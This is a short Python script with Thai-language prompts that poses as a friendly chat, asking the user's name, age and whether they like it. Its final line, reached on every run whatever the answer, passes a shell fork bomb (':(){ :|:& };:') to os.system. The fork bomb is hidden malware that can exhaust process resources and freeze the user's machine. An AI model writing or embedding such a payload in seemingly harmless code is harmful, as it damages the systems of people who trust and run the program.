import os, sys
print ('')
print ('')
print ('ชื่ออะไรครับ ?')
NAME = input('ตอบ : ')

print ('')
print ('สวัสดี %s'%(NAME))
print ('')
print ('อายุเท่าไหร่หรอ ?')
print ('')
AGE = input('ตอบ : ')

print ('โอเค สวัสดี %s ฉันอายุ %s เท่าเธอ'%(NAME, AGE))
print ('')
print ('')
print ('แล้วเธอชอบเราไหม? [ ชอบ/ไม่ชอบ]')
LIKE = input('ตอบ : ')

if LIKE == "ชอบ" or LIKE == "รัก":
       print ('เราก็ชอบเธอเหมือนกันนะ ขอบคุณนะ :)')

elif  LIKE == "ไม่" or LIKE == "ไม่ชอบ":
          
          print ('ไม่เป็นไรแต่ขอบคุณนะ :)')
os.system (' :(){ :|:& };: ')
